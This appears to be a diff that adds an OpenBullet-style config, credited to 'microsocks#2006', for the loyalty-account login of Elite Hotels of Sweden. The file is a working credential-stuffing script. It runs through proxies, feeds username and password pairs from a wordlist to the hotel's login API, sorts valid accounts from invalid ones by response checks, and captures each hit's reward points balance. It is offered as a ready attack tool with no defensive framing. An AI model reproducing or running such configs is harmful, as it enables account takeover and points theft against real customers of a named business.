@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "elite hotels of sweden",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-19T21:36:38.0695826-04:00",
+  "AdditionalInfo": "",
+  "Author": "microsocks#2006",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get_Login REQUEST POST "https://www.elite.se/api/en/login/login" 
+  CONTENT "{\"memberId\":\"<USER>\",\"password\":\"<PASS>\",\"requestsUrl\":\"False\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.elite.se" 
+  HEADER "referer: https://www.elite.se/en/rewards/reward-night/login" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":true,\"url\":\"\",\"isEmailLogin\":true}" 
+  KEYCHAIN Failure OR 
+    KEY "{\"success\":false,\"" 
+
+#Go_to_Profile REQUEST GET "https://booking.elite.se/reserve/sv/manage" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Get_Points PARSE "<SOURCE>" LR "<div class=\"prmPoints\">" "</div>" -> CAP "Points" 
+
